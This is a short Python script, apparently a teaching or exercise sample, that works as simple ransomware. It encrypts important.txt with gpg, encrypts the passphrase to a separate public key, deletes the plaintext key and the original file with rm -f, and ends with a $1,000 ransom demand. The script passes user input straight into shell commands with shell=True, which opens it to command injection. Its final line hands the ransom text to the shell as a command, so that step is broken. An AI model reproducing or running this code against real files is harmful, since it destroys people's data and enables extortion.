#!/usr/bin/env
import subprocess

key = input("Enter your key: ")

#saving key as a file
f = open("key.txt", "w")
f.write(key)
f.close()

#encrypt important.txt using symmetric encryption
subprocess.call("gpg --pinentry-mode=loopback --passphrase " + key + " -c --armor --output encrypted_message.asc important.txt", shell=True)

#encrypt key.txt using public encryption
subprocess.call("gpg --recipient-file pubkey.gpg.asc --output encrypted_key.asc -e --armor key.txt", shell=True)

#removing key and important files
subprocess.call("rm -f key.txt", shell=True)
subprocess.call("rm -f important.txt", shell=True)

#showing ransome message
subprocess.call("'Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send encrypted_key.asc to me'", shell=True)
